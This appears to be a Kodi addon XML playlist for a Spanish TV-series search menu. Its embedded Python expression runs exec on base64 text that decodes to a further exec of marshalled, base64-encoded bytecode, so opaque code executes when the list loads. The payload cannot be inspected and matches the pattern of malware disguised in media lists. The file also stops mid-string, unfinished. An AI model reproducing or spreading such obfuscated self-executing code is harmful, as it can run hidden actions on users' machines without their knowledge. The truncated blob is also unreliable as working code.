<?xml version="1.0" encoding="UTF-8" standalone="yes"?>





<item>
<title>[COLOR white][COLOR orange]BUSCADOR [COLOR white]Series [COLOR gold]NUEVO[/COLOR] </title>
<link>$doregex[makelist2]</link>
<regex>
<name>makelist2</name>
<listrepeat><![CDATA[
<title>[COLOR white][makelist2.param1] [COLOR aqua][makelist2.param4] [makelist2.param5][/COLOR]</title>
<info>[COLOR white][makelist2.param1] [COLOR aqua][makelist2.param4] [makelist2.param5][/COLOR]</info>
<link>$doregex[temp]</link>
<thumbnail>[makelist2.param2]</thumbnail>
<fanart>https://i.imgur.com/KFAuyll.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
import re,requests,base64,xbmc,xbmcgui,xbmcaddon,shutil,random,urllib2
import base64;exec(base64.b64decode("aW1wb3J0IG1hcnNoYWw7ZXhlYyhtYXJzaGFsLmxvYWRzKGJhc2U2NC5iNjRkZWNvZGUoIll3QUFBQUFBQUFBQUJRQUFBRUFBQUFCemlRQUFBR1FBQUdRQkFHd0FBRm9BQUdRQUFHUUJBR3dCQUZvQkFHUUNBRm9DQUdRREFGb0RBR1FFQUZvRUFHUUZBRm9GQUdRR0FGb0dBR1VIQUdRSEFJTUJBR1VIQUdRSUFJTUJBQmRsQndCa0NRQ0RBUUFYWlFjQVpBb0Fnd0VBRjFvSUFHVUhBR1VKQUdVQUFHb0tBR1VIQUdRTEFJTUJBSU1CQUdRTUFHUU5BSU1EQUlNQkFBRmtBUUJUS0E0QUFBQnAvLy8vLzA1MHZSZ0FBRWw1UW14aWJVNTJXa2RXYTBsSFNqVkVVVzlxU1VWYVZWSjNNRXRFVVhCd1lsaENkbU51VVdkWmJVWjZXbFJaTUV4RFFqWmlSMnhwVEVOQ2FtSXlVbXhaTTAxelNVZEtjR0p0Um5wWk1teHdSRkZ3ZEdJelNuZGhSMVl4WTNsQk9VbERZekpPVkZKb1RucHJNMDVFV1RGTmVra3pUbFJWZDAxNlVUSlphbGsxVFhwSmVrNTZXVEpPYWxVeFRucEthVTV0UlhsWmFrMTNUbXBSTUU1RVRUTk5la0V5V1ZSU2EwMTZZekphYW1NMVRtcGplVmxxV20xT1ZGVjZUVVJaTkUxNlRUTk5hbHByVGxSUk1GbHFZM2xPTWtVd1RWUlJNVTU2UVRCWmVsRXlUa2RGTTA1NlVtaE9iVmt6VG1wTk1FNUVUVEJaVkZKb1RrUlJNRTFVV1hoT2Fra3hUWHBaTUU1SFNURk5SRlUwVFhwTmVWcHFWVE5OZWtrelRWUk5NazU2VlRKT1ZGa3hUbTFGTWxwcVRUSk9iVlY2VG1wTk1FNXFSVE5OVkZVeFRtMVpNazE2VVRCT2FtY3lUMVJqTkUxNlRYcE9hbU42VG5wWk1VNTZVbTFPZWxsNlRtcFZkMDF0V1hwT1JFMHpUbFJuTWxsVVVtcE5lbU42VDFSS2FVNVVRWHBOZWsxNlRYcG5lazU2V1RCT1IwMTVXbXBLYVUxNlp6SlBSRXBwVFcxWmVWbHFWVE5PYlZVelRucE5NazU2YTNsWmFrcHRUVzFaTWxwVVVUVk9lbFV6VFZSS2JVNTZXVEpaVkUwd1RYcGpNazVxVVRCTmJWa3pUbFJLYlU1RVp6QlplazB5VGtkWmVWcHFTbTFPUjFFeFQxUlZlVTF0U1RKT1JFMDFUVzFaZVZwcVdYaE9WR042VDBSVmQwMTZXVE5OYWsxNlRYcFJlVnBxVlhkT2Vsa3pUbXBLYlUxNlRYcE5WR013VFhwcmVrOVVWVEpPUjFWNlRucE5kMDVxVlROUFZHTjZUbFJaTWxwVVVUSk9la2t6VDBSWk1VNVVXVEJOYWxGNlRrZFZlazE2V1RKT2FtY3lUbFJTYVU1RVRYcFBWRmw1VG5wSk0wOUVZM2RPYlVWNlRsUmplazVYUlRGT2Fsa3dUbXBSTWs5RVVtMU9WRUY1V21wU2JFNXFTVEpPYWxKc1RucEZNVTVxV1RKT2VrRjVXV3BhYWs1SFdYcE5hbFYzVFcxSk1rMXFXVEpPZWtreVdYcFJNVTVFV1ROWlZGVjNUVzFKTUUxNll6Tk9SMWw2VFZSak1VNTZSWHBPYW1ONlRXMVpNVTlFV1RKTmVtY3hUbXBOTVUxNlJUTk9lbFYzVGtkWk1rNUVXVEJPYWtWNlRYcGpNMDR5UlROTmVsa3lUa1JKTWxsVVkzZE9la0Y2VDFSTk5FNUVZek5OYWxwclRtMVZNVTVFVW14T1ZFbDZUWHBOZWs1SFJUTk5hbHBwVG1wRmVrNTZXVEZPUkZsNVdtcE5lazVFV1RGUFJHTjVUbXBuTTAxcVdURk5lbXN3VDBSUk5FNUhWVE5OYWsweVRsUm5NRTU2WTNkTmJVbDZUbnBaTUU1RVVUSk9SRmt4VG5wQk1GcFVZM2RPYWtVd1RtcFJNMDU2VVRKTmFscHFUWHBuTTAxRVdYaE5lbXN3VFdwUk1rMXRTWHBOZW1NMFRtMUpNVTlVVFhkTmJVa3dUMVJOZWs1VVRYcE9hbGw2VFhwak1rNVVUVE5PUkdjelQwUlNhMDVFUlhwT2VtTXlUbnBWTUZwVVkzZE9ha1V6VGxSamVVNTZWVE5QUkUwelRucFJNazVVVFRWT1ZGRXpUa1JaZWs1RVl6Tk9hbU0xVFcxWk1VMTZVVFJPVkVFd1dsUmpkMDVVVlhwTmVsVjNUVzFKTUU5VVkzbE9WMFY2VFdwUmVVNXFWVEZQVkdONVRtMU5NRmw2VVRKT1IwMHpUWHBOZWs1SFRURk5hbEp0VFhwamVrMUVZekZPZWxFd1dXcFZNazE2WXpGWlZGa3hUbnBCTWs5VVdUUk5lbU13VDBSWmVFMTZTVEZOUkZVeVRYcFZNMDVFVFhkT2FtY3hUVVJqTkU1NlFUQlpWR041VGtSSk0wNUVZM2RPYWswd1RtcFNiRTV0U1RCT2FsbDZUbnBaTVU1NlVtcE9SMVV3VGtSWmVFNTZaek5OYW1OM1RsUmpNbGw2VFRKTmVrbDZUbnBaTkU1dFZUSmFWR041VG1wUmVrNXFTbTFPUkdNeVQxUlpORTVFVlROUFJHTjNUWHBOTUUxNlRUVk5lbGt3VGtSTmVrNUhSVEpPZWxVMFRrUm5NMDFVV1RST1ZFRXdUbXBhYUUxdFdURlpWRkY2VFhwak1VMTZUVEpPUjBreldWUk5NMDVFWnpGTlJGSnRUbnBOTTAxcVdtcE9hbU14VFVSTk0wMTZZM3BPYWtwcFRsUnJlazFxU20xT1JHTXpUV3BqZWs1cVp6QlBSRmsxVFhwTmVrNXFVbXhPYWxVeFRucFNiRTR5UlRCT1ZGbDZUbFJOTUU1NlZUQk9la2t5V1hwS2FVMTZUVEphUkZVeFRrUlpNazVFVlhsT1JGRXlUV3BOZVU1NlVURlBSR013VG5wak0wNVVWVEpOZWxGNlRYcFpNVTVIVVhwUFZFcHRUa1JuTUU1Nll6Sk9WR2N3VG1wWmVrNXFTVEJPZWxFMVRtcFplazFVV1RCT1Iwa3pUa1JOTTA1RVVYbFphbEpyVFhwVmVWcHFZek5PVkdjeFRVUmplazVIV1hwT2VsRXpUWHBSTTFsVVRUQk5lbU14VDBSWk1VMTZXWHBPYWxVMFRtcEZNRTVVVFRGT2VsbDZUa1JOZVU1NlozcE5WRmt6VGtkSk1rMVVWVE5PZWxreFRWUk5NVTU2WnpKWmVrMDFUWHBaZWs1cVdUTk9lbWN6VDFSTk1FNXFTWHBOVkUwd1RucFJNRTVVV1ROTmVtc3lXVlJSTlU1NlVUQlphbU0xVGtScmVrOVVUVFZPVkdzeFQxUk5OVTV0VFRCT1JGVjNUWHBOTWs5VVdURk9lbWQ2VDBSWmVVMTZRVEZOUkdNeFRsZEZNazVVV1RST2FsRjZUMVJSTWs1RVVUTk9WRkpyVFhwRk0wOUVUWHBPYlZFelRYcFZlVTVxVVRCT2FscG9UbnBaTWsxNldUUk9la1Y2VFhwak5FNXFWVEZPUkZKdFRYcEZNbHBFVFROT01rVXdXV3BqTWs1RVRYcE5lbU15VGtSck0wNVVZekZPZWxVd1RucFplazF0U1hwTlZGVjZUbnBKTWxwVVdYcE9lbXN5V1hwTk5VNTZaekJQUkZwclRtcG5NMDVVVlRGT1JFbDZUMFJLYVU1Nlp6Tk5hazE0VGxSWk1FMXFVVE5PZW10NlRucFplazE2VFRCYVJGVXdUVzFKTUZwRVZYZE9hbGt6VFZSWk0wNTZXVEZPVkZrMFRYcHJNMDU2VFROT2VtdDZUbFJTYkU1RVNUQk5hbFV5VG5wUk1FMVVTbWxPYlZFeVRXcGpNazU2U1ROT1ZGVjVUbXBaTWxwcVkzaE9hazB5VGtSa2FFNTZXVEJQVkVwdFRtMVZNVTFFV1RGT2Vtc3hUbnBWTVU1dFJYcE9lbHB0VG0xWk1sbDZXVFJOZWswelRYcGpNVTF0U1RCTmVrMDFUbTFOTWs5RVpHaE9hbGt6VDFSVmQwMTZXVEJOVkZreFRqSkZlazVVVVRCT2JWVXpUWHBXYUU1RVl6Rk9SRXBwVG5wQk1GcEVZelJPYWxsNlRtcFJNVTVFVVhsYWFsSnBUbnBKTWxwcVl6Qk9lbXN3VFdwTmVrNXRWVEpPZWxFeFRYcGpNVTE2V21oT2FtdDZUWHBWTkU1cVl6Rk5hazAxVGxSRmVrNVVUVEZPZWsweFRVUmthRTVFWnpKT1ZGVjVUbFJaTVU1NlVYcE5iVmt6VGxSak1VNUVVWGxhYW1NeFRtcE5lazVVVVROT2VsVXhUV3BWTUUxNll6QmFhbU15VFhwVk1VNUVXbXhPYlZVeVdtcE5lazE2VFROTmVsVjZUbXBKTUU1NlZUVk5iVmw2VFdwUk1rMTZWVEpPVkZFeFRsUlJlVnBxWXpGT1ZFRXdUbnBaTVU1RVJYcE9lbGt3VG1wTk1GbFVUVFZOZW1zd1RrUlNhazF0U1RCTmFtTXlUbFJuTTAxcVkzaE9WRlY1V21wWk1FNUhUWHBOYWxsNFRYcHJNRTlFU20xT1ZHTXdXVlJTYkUxNll6QlBWRTAxVFhwWk1rOUVWWGRPZW10NlRucFJORTU2V1hwT2FsVjRUWHBWTTA1cVZYaE9iVTB6VFdwYWEwNTZVVEJOZWtwdFRucEJlazVVWXpWT2Vtc3dXbFJhYlU1NlFUTk9hbU41VG5wVk0wNTZWbWhOYlZrd1RrUmFhRTVIV1hsYWFtTTBUa2RSZWs1RVdUTk9SRlY1V1dwamQwNXRVVEJPYW1NeVRYcFpNRTFVVVRKTmJVa3lUMFJaTVUxdFdUTlBWRlYzVGtSSmVrOVVXbWhPVkdjelRsUlpORTF0V1RGTlJGVXlUbTFaTUU1VVdUVk9SR3N3V2xSWk5VNVhSWHBQVkZKcFRXMVpNMDE2VVhsTmVtTXlUMVJOTVU1VVJURk9SRTB6VGxSVk1rMXFTbWxPYWxVd1RWUlplVTV0VFRCYVZFcHBUa1JGTWs1cVl6Qk5la0V4VGxSWk0wNXFUVEpOZWxreVRYcFJNazVVWkdoTmVrMHpUbXBhYlU1Nlp6RlBWRlV4VFcxWmVrOVVXWGxPVkZFd1RXcFJlVTVxV1ROTlZGRXdUa1JuZWs1RVl6Sk5iVWt4VDFSak1VMTZVVEZOUkUwMFRYcEpNRTVFU21sT1JFVXdXbXBqTVUxNldYcFBSRkpwVG1wWk1VMTZZM3BOZWxVeVRXcGpNMDVYUlhsYWFsa3pUbTFGZWs5VVVYaE9SRVY2VG5wamQwNVVRVE5QVkZFeFRtMVZNMDFxV21wTmJVa3pUbXBqTlU1NlFUQk9hbEUwVG5wcmVrNTZXbXRPUkUweFRucFNhazVVYXpCUFJFMTVUbnBaTTA1NlNtMU9WR3N3V1hwTk1rMTZUVEpQVkZFeFRrZFplazVFVlROTmVtY3dUbXBLYlU1VVNUTk9ha3BwVG5wUk1GbFVVVEpPZW1jd1RrUlpNVTVIVlROTmFsazBUVzFaTWxsVVZURk9lbGt4VDFSVmQwMTZSWHBQUkZFMFRYcGpNazU2VlRWT1ZHZDZUWHBhYlU1RVRYcE5lazB3VFhwRk0wOVVVWGhOZW1kNVdtcFNhVTVFVVRGT1JGazFUa1JOTVUxRVkzZE9iVWw1V21wU2FrNTZWVEJQVkZKb1RqSkZNazVVV210T2Vra3dXbFJSZUU1RVdYcFBWR013VGtkUmVrNTZUWGxPUkVsNVdtcGFhMDV0V1RKTlZFMHdUbFJKTUU1cVl6Vk9SMFV5V2xSWk0wNXFWVEpPYWxwcVRtMUZNbHBVV1hoT1JGa3lUbXBhYVU1VVVUTk9hbEpxVG1wVk1rMXFVVEJPVkVFd1dsUmthRTV0UlRCTmVsa3lUa2RWTUU1RVZYZE5lbEV3VDFSU2FrNUhVVEpPVkZsNVRtcFJNVTFVVlRSTmVtTXpUWHBSZWsxdFdUTk9SRmt3VG5wak1sbHFTbWxPUkdONlQxUmthRTV0VVRGTlJGSm9UbnBGZWs1RVl6Tk9hbGt5V21wUmVFNVVVVEZQVkZwclRtcFpNRTVVVW10TmVrMHdUbnBSTWsxNlkzcE9hazAxVGtSbk0wMTZVWGhPYlZVeVdXcFpORTVVWjNwUFJHTXpUWHBOTWxsNlpHaE9SRlV5VDFSYWJFNTZWVEpQVkUwelRsUlZNazE2VW1wTmVtdDZUV3BTYVU1RWF6QlBSR016VGxSUk0wMVVZelJOZW1NeVRucFNhazVxVVRCUFZHTjNUWHBSTUU1cVNtMU9iVkV6VDFSU2EwMXRTVEpOVkZFeVRsUm5lazFFVW14T2Vsa3dUV3BaTWsxNlFYbFphbGw1VFhwSk1VMXFXVEJPZW1NeFRWUmpNRTVFWjNwUFZHTjZUbFJqTVU5VVVYaE9SR042VGtSWk5FNUVVVEphYWxGNFRucEpNRmw2WXpKT1ZGRXlUbFJaTlUxdFdYcE9WRkV6VGxSak1FOVVXVEpPYlVVeFQxUlZkMDVxVFRCWmVrcHRUa1JyTWsxcVRUSk9WRUV5V1dwUk1VMXRTVE5QUkZFMFRsUmpNVTFFV1RCT1ZFa3dUVlJqZVUxNlp6QlBWRkpzVG1wbk1VNUVaR2hOZWsweVdsUkthVTE2U1RKWmVscHNUbTFKZVZwcVRUSk9SRmw2VDFSTmVFNTZXWHBPUkZreFRsUk5lazlFVFRCT1ZFVXlXWHBqTkU1SFVUSk9SRXB0VGxSSk1GcFVUVE5PUkVsNVdtcFpNazU2YTNwT1ZGcG9UakpGTUZwVVNtMU9hbXN5VGtSTk5FNVVhM3BOYWswMVRrZEpNRmxVWXpGT2VtY3dUa1JqZVU1NlRUSlBWRkV3VG1wck1FMXFWVFJPUkVVeVRtcGFhVTVIVFRGUFZGRXpUbXBGTTA1cVVUQk9SMUV3VGxSUmVVMTZVVEZOUkZKcFRrZFpNazE2VlRKT2VrRXhUVlJWTUU1dFNYcE5SRTAxVFhwUk1FNUVVbXRPVkdjeFRucFZNMDVxWXpKYVZFcHBUa1JWZWs5VVZYZE9lbGt3VDFSVmQwMTZaekJaVkdNeFRsUlJNbHBxV1RWT1IwVXdXa1JWZWsxdFdUTlBWRTB6VFhwck1rNTZXVEpPUkdNd1RsUk5ORTVVV1ROT2Vsa3lUbXBWTUUxNldYcE5lbEV4VFdwTmVFNHlSVEphUkZreFRucHJlazU2VFRST2Vra3pUWHBLYlU1NlFYcE5SRXB0VG1wak1rNUVVbXRPVkVVelRsUlplazE2UVRKTlZGcHNUWHBSTUZsVVVtMU9WRkY2VGtSS2JVNXRTWHBPVkVwdFRYcFZlazFVWXpOTmJWbDZUVlJhYlU1VVp6Sk5lbGsxVG5wSk1rNTZUVEZPUkZreVdrUmpNMDU2U1ROUFJGRXdUVzFKTTAxRVRUTk5lbEV5VFdwS2FVNUhUVEJhYW1ONlRsUkZNRnBFVFRWT01rVjZUVlJhYTA1SFdUQmFWRTE1VG5wUk1FNVVXWHBPUkVreVdsUlJlazV0V1RGUFZGazBUWHByTVUxVVZUQk5lbWN4VDBSUk5VNUhWVEZOUkZVeVRrUlplVnBxWXpOT1JGa3dXWHBSZVU1SFNURk9lbFV6VGtSck1rNXFXbWhPUkZFeVRtcFZNRTU2V1RCUFZGRXlUWHByTWsxNlVtcE5lbEV5VDFSS2FVNXRVWHBPZWswMFRrUkZlVnBxV1RWT1IwVXhUVVJqTkU1NldYcE9SR00wVGtSVk1FOUVUVFJPUkZreldWUlpOVTVFWTNwTmFtTXlUa1JWZWsxRVVUTk9hbEV3V2tSak1rMTZTVEZOYWxreFRYcFpNazU2VlROTmVrMHlXa1JWTlUxdFdYbFphbU16VGtSTmVrMTZXbTFPUkVreVdsUmFhMDVFUlhsWmFsRXpUbTFOTUU5VVRYcE9iVmt3VDBSWk1rMXRXWHBPVkZFelRsUkJNRnBFWXpKT2VrVXlUMFJWZWsxNlJUTk9lbHBwVGxSQk0wNUVVbTFPVkdjelRWUlZNVTVxVVRCT2FsSnRUWHBuTUUxVVdURk5lbGw2VDBSUk1VNXFWWGxhYWxKdFRucFZNRTFxWXpOTmVtY3hUa1JTYkU1VWF6SlphbGt4VG5wSk1rMTZWVEJOZWtrelRYcFJNRTVxU1ROUFJHTTBUWHBGZWs5VVZYaE9la2w2VDFSTmQwNUVWVEpOYWxVelRucE5NVTFxVFhwT2JVa3lUWHBTYlU1dFRUTlpWRkUxVG5wRmVrNXFXWGhOZWxFeVRWUk5NRTU2UVRGT1ZHTTFUbTFWZWs1RVZUUk9lbGt3VFdwS2FVNUhWWHBOYWsxNFRtcGplVnBxU20xT2JWVXpUWHBTYUUxdFNUQk5lbEUwVGtkTk1VMVVVVEJOYlZreFRWUlZNazE2U1RKWmVrMHpUakpGTUZsVVdUSk9SMUV5VFdwak1rNXFhekJPVkZreVRtcEZNazU2VFhwT1Iwa3lXa1JaTlU1SFRURk5SRTEzVFcxSmVrNUVVWHBPZWtrd1RsUmpNazVxVFRKTmVsVjVUVzFaTTFsVVdURk9iVkV4VDBSS2JVNXRTVE5PVkdNelRsUlpNMDlFV21wT1ZFRXlXa1JOZDA1dFdUQlpWRXBwVG5wVmVrNUVXVEZPYWxreFRWUmpNazE2WnpGTlZHTXdUWHBSTTFsVVkzbE9iVkV5VGxSWk5VMTZUVE5QUkZsNVRsZEZNbGw2VW1sT2Fsa3dXbXBSTlUxNmEzcE9hbHB0VG5wUmVrNTZZM2RPZWtsNlRVUlZNazE2VlRCYVJGRTFUbXBWTVUxNldUVk9WR2N6VDBSak5FNTZXVEpQUkZrd1RtcE5NbHBFVFROT1IwVXlXa1JOZUU1NmF6Rk5SRmt4VFhwVk1VOVVUVFJPVjBWNVdtcEtiVTVFYXpKTlZGbDVUa1JOTVU5RVRURk9SRWw2VFhwVk5VNUVXWHBPZWxsNFRrUk5lVnBxWXpOT1ZFRjVXbXBOZVU1cVl6QlBSRlUwVFcxSk1VOVVXbXhOYlZrd1RYcGpNVTVVYXpGTmFtTTBUa1JGTWxwVVRUVk9SMGw2VFZSWk0wNXRSVE5aVkZwclRrUlZNbHBVVFhkT1ZGa3hUVVJTYTA1SFZURk9SRkV4VGtkWmVrOVVZM3BPVkVWNlQwUlJNMDVxV1hwTmFsRXdUbTFWZWs5VVl6Vk9WR2N4VFhwTk1VNTZZekJOVkUwelRtcG5NVTVxV1hwT2JWVjVXbXBSTWs1SFNUQk9lbFY0VGxSbk0wNXFUVEZPVkZFeVdsUk5OVTVFU1RGTlJFMHlUbFJCZWs5VVZYbE5la1Y2VG5wUk5VNXFXVEpaYWxsNFRucE5NazlFVlhwT2VtY3dXa1JaTVU1VVNUTk9SR1JvVGtSck1rNUVUVEJPUkVVeVdsUk5NVTVxVVhwUFJGVjVUakpGZVZscVVtaE9lbGt3V1ZSVmVVNUVaek5PZWxVMFRtMUpNMDU2VFRGT2FtTXlUbXBOTWsxNlp6QmFWR015VG1wak1VNXFZekpPUjFFeFRWUk5NMDVxU1RKT2VsVjVUWHBCZWs5VVdYcE9WRlY2VG1wWmVVNXFZekpQUkZwcFRucFZNazVxVFRGT1JFbDZUMVJqTTA1dFNURk9SRkUxVGxSamVrOVVVVFJPVkVFd1RsUmFhRTF0U1RCTlZHTXpUbXBOTTA5RVRUTk9iVWt3V1hwU2FVNUVTVEZQUkUxNVRucEZNMDlFVlRWT2JWRjZUbXBaTlU1RVVYcE9SRkp0VFhwck1WbFVVVFZPYWtreVRucFJlRTF0V1ROUFJHTjVUbnBOTVU1RVZYZE9lbGt5V2xSTmVrNUVUWHBQVkdNelRucG5NRnBxVVRSTmVsRXhUa1JhYkU1RVRURk5SRXBwVG5wck1scHFXbXBPYlVWNVdtcFNiRTE2VFhwT1ZHTjZUbTFKTTFsVVRUTk9SR3Q2VFhwTk5VNUVWWHBOZWswMFRsZEZNRTVFVFRST2FtTXpUVVJTYWs1NldUQmFSRTE0VFhwUmVrNUVUWGhOYlVrelRucGpNazV0U1hwTlJFcHRUa1JuTWs5RVRYaE9WMFV5V2xSak0wNUVTVEJPYWtwcFRYcEpNazVxVW0xT1IwVXdUbFJTYVU1NldUSlBSRnBvVFhwbk1VOUVVWGxPUkVVelRtcFpOVTU2WnpCYVZHTTBUa1JWZVZwcVdtdE9SRWt3V21wV2FFNTZXWHBPUkZFMVRrUlJNazlFWTNsT1ZGVXlUV3BOTUU1RVdYcFBSRlY2VG5wRk1sbDZWWGROZW1jelRWUkthVTVFVlRGT1JFcHRUbGRGTWs1NlVUUk5iVmt3VFZSak5FNVVSVEJPZWxWM1RsUlplVnBxVlhoT2VrbDZUV3BSZUUxdFdUTk5hbEV5VGtkUk1VMXFXbWhOZWxVeVdrUlZkMDVxYXpCTmVscHJUbnBOTWxsVVl6Sk9lazE1V1dwWmVFNXFZekJPUkZFMVRtcHJNbGxVV21wT2Vtc3dXVlJSTkU1cVRUQlBSRXB0VGtSbk1rNXFVbTFPVkUxNlRWUlJNMDU2UlRGT1ZGSnRUWHBKTWsxcVdUQk9SMUV6VDBSTk0wNTZhM3BQUkUweVRYcFpNVTVFWXpGT2JVVXdUVlJaTUUxNldUSlphbFY2VGtkRk1sbHFZelZPUkdONlRYcGFhMDV0V1RCYVJHTXdUbXByTVU1RVdYcE9hbFY2VDBSS2FVNUVhM3BPZWswMVRrUlJNMDFxV21sT2VrRXhUbXBOTTAxNlp6Qk9lbFUwVG5wQk1FNUVWWGRPUjBrd1RsUmpNVTE2UVRCYVJGVjVUbXBSTUU1cVpHaE9hbWN5V2tSWk1VNVVhekZOUkVwcFRYcEJNMDU2WXpCT01rVXlUVlJaTlU1VVFYcE5WRnBzVGtSck0wNXFUWHBPUkZVd1RXcE5ORTE2V1RCUFJGa3hUbXBKTVU1RVVURk9la1V4VFVSTk1VNXRTVEJOVkUwMVRrZE5lazVVV1ROTmVrMHlUVlJaTkU1cVZUTk9SRnBvVG0xVk0wOVVXbXBPZW1jeVQwUk5lazV0UlRGTlJFcHBUbFJyTWs5VVZUUk9lbEV3VFZSS2JVNXRSVEphUkZWM1RsUlpNRnBVVlRCT2VsbDZUWHBSZUU1VVFUTk9SRlV3VG5wSk1rOVVXWGxPZWtVeVdYcE5lazU2VlRKUFZGVjNUWHBOTUUxNldYcE5lbXN5VGxSU2EwNVVVWHBPVkUwd1RrZFpNazVFV214TmJVa3pUVlJaTWs1dFdUQk9ha3B0VFhwUk1GcHFTbTFPVkZrd1RsUkthVTE2U1RKT2Vsa3hUbXBaZWs1RVdUVk9hbEY2VGtSYWFFMTZUVEphUkZGNVRrZFZNVTFVV214TmVtY3lUa1JOTkU1cVl6TlpWRTEzVGtSTk1rNXFWVE5PUjBreFQzUzlHQUFBUjAxM1FXMVdNRTFSVERCQmQxb3lURzFJTUVGdFREQkJVVWd3UVZGSU0wRjNUWGRCZDBSdFFVZE1OVUYzVERKQ1IwVjRRWGRJTUV4M1JYVmFiWFF6UWxGRU5VRjNURE5hVVVneVdtMUlNVnB0Y0ROQlVWWXhRbEZFTTBGUlZtMWFiVVF6UVZSSU0wRkhSWGhhYlhSdFFYZE1NMEZ0VmpKTWQxcHFRVXBTTTFwM1dqQkJNbEl3UVhkeGRVRlJlREZhVVhBMFFYcFdNRUZ0VjNwQlVYQXdRVWRNTUVGM1ZqTmFiVnByV20xRU0wSkhURFJhYlZvelRFZEViRUZSY0ROYWJVMTZRVWRXTUUxM1dtMUJWRnBzVFhkRmVscHRkREJDVVVnMFFWRkliRXgzUlhsYWJYUXpRbEZJYWtGM1REQkJkMWQ2UVcxYU1GcEhXakZCVkZveVFYZEZlRUZ0Vm0xQlVVMTRRVlJhTUV4dFJYcEJWRWd3VEcxYWFrRlJlRzFDVVVodFdtMXdNMEpIUlhwYWVrd3hXbTFOZDBGdFRqTmFVVm94UVhwRU1WcFJTREZCYlZwdFFYZE1ORUZVVWpKTWJVaHRRVkZNYlVGSFJHdEJSMDR4UWtkRU5GcHRlRE5CYlhBMFFYZFdiVnBSU0RCYWVsWXhRa2RFTWxwdFVqSk5VVnBxUVVwU2JWcEhXakJCVVVoc1RYZEZlRUZIU0RGQ1IwZ3lXbTFFYlVKSFJHdEJkMUl5V20xRmRVRjZTRzFCYlVnMVFXMXdNMEpSUkd0QmQwUXpXbmRFTVVGSFJESkJkMGcxUVhkYWJVRlJTR3hhYlZJelRFZE5kVUYzVERCTVIzQnJXbTFFTUZwdFJEUmFlbFl5UWxGSU5GcHRSREpNUjB3eVFXMWFNRnBIV2pKYWJWWXdXbmRNTkVGdGVESkJiVWhxUVVkYU1rSkhSRFJhYlVnd1duZHdiRUZSY0RKTmQxcHNRVkZTTTBGUldqVkJVVWd4V25kYU0wRnRXakpDVVZvelFYcEViRXgzU0ROQlVWSnRXbEZhTVVGUlNERmFVVVY0UVZGMGJVRjNSREJhZWxZd1FrZEliVnB0UkRCTmQzQXhRWGRXTWxwSFNEUkJla1F5VFhkeGRWcHRTRE5hUjBsMVFYZE1NMEpSY0RSQlVWSXdRWGRGZDFwdFRESkNVVWcwUVVkd01rMVJTRzFCZWtneFFsRmFORUYzY0ROQ1IzQnFRWGQ0YlVGUlJHMWFiVm95VFZGd01rRjZVakJDUjBRelFXMU9NMXAzVjNaQlVYZ3hRbEZ3TUVGM2NESk5SM0F4UVVkRU0wRjNjRzFCVVhnelFWRmFNMEYzY0RGYWQxcHFRVzF3TUVGUmNHeEJkM2hzVFhkTmVscHRTRE5DVVVnMVFVZGFiRXgzVFhwQlIwNXNUSGRFTUZwdFVqTkNVVWd4UVhwRU1FeDNURzFhYlhSdFFYZEliVUZ0V20xQlIxb3dRWHBXTUVGM1dqUkJWRXd5UVVkTU1VRjNXakpCUjNCclFXMTBNRUZSVFhoQmJYQXhRVzFJTVVGdFNEQk5VVTExV20xYU0weEhSREpCYlV3d1FrZEViRUYzUkRKQ1VVaHFRWHBhTUUxUmNETkJSMUpzVEhkRU5VRkhSR3hNZDAxNFFVZHdNRTFIU0RKQmQzQXdXbTFJYWtGM2VETkJiWEF5V20xNGJWcFJTR3hCUjFac1RYZEZkMEZSY0RKQmJVaHFXbTFTTWsxUlJYaEJkM2d6UVhkYU5FRjZSRzFCZDB3MVFXMU1iVUZSVFhWYWJYZ3hRa2RNTVVGM1dqQkJSMW93UVVwU2JVRjNTR3hhZWxZeldsRmFNRUZ0Y0RGQ1VVZzBRVlJJTWtGUlNETkJVVkp0V20xYU1FRjNkREJDVVZvMVFYZDRNVUZSVERWQmJVd3hRVzFFTTBGM1JEQk1SMHd5UVVkSU1GcDNXak5CUjFveFdsRndNMEYzZERGYVVWcHFRWGR3YlVKSFNESkJlbFl3V20xSWFrRnRUakpCZDB3eVdtMXdNMXAzV2pOYWJYaHRRbEZJYWtGVVJHMUJkMXB0V20xMGJWcFJUREpCVVhRd1drZGFiRUZIZEROYVVVMTNRVlJTTWsxSGNHcEJiWFF3VEhkYU5VRkhkRzFhYlV4c1FYZDRNRUZ0VjNwQlVVUXpRWGRJYTBGNlVqRmFkMFY1UVVkMGJWcEhjR3hCTWxJeFduZHdiRUZLVWpGYVVVVjZRVlJhTVZwdFREQmFiVll3VEcxYWFscHRjRE5NUjBnMVFVZEVNMEZSUlhsQlNsSXhRVzFFYkVGM1dtMUJkMHh0UVVkU01VeEhTR3BCZDNneldtMU5kVUZVVm0xQ1VVaHFRVkZhYlVGM1RERkJkMFJ0V25kRU1rRjZSRE5CYlZkMldtMTBNVnAzV2pKYWVsWnRRbEZhTlZwdFdqQk5VVnBxUVZGSU1FRjNTREpCU2xJeldrZElNa0Z0VmpGTVIzQnRXbTFhYlVKUlREVkJlbEl3UWxGSU5FRjNTREZCZDBWNFducE1NazFIU0RCQlZGWnRXbEZOZVVGUlVqQkJVWEYxUVZSSWJVRkhUWGhCZWxveVRWRmFORUV5VWpCQmJVVjZRVlJXTTBKSGNHcEJla2h0V2xGYU1rRnRjRE5hYlhCc1FWUlNNVnB0VERCYWJVNXRRVzF3TTBGM2NERkNVVWd6V20xME1FRjNUWGhCUjA0d1RWRkZkMEZVVmpKQ1VVVjRRVlJTTTBGdFdtdEJWRWd6V2xGd00wRjZTREJDVVVnd1FYcE1NMXBSY0RSQlZGSXlRVWRKZFVGdFRETmFiVTE1UVZGNE1scEhTREpCYlhnd1RYZEZlRUYzY0cxQlVYQTFRWGRTYlZwdFdteEJSM0F6UVZGd2JFRlJURE5DVVhBMFFVZEVNMXBIY0RSQlIzUXlUVkZJTWtGNlZqSmFiVTEzUVhwV2JVRlJSWFphZWxZeFduZHdhMXB0ZERCQlVYQTBRVEpTTUVKSFJYWkJVWEJzVEhkeGRWcHRSRE5hZDB3elFXMVdNVnBSVFhwYWJVNXRRVWRhYTBGdFNESmFSM0YxUVhkSU1VRjNSREJCU2xJd1FXMU1NVUZIVm0xYWQwaHRRVzFNTVVGdFRYWkJSMDR4V2xGRmVrRjZSREJNZDNBeVFWRlNNa0ZSVEcxQmVrZ3pRVWRNTWtGSFJESk5kMFF3V20xNE1GcDNjREZCVVhBd1FYZEZlRnB0VG0xQlIwMTFXbTE0YkV4M2NHcEJVVWd3VEhkYU1FRnRURzFCYlhBelFVZDBNMEZzY0VGUVl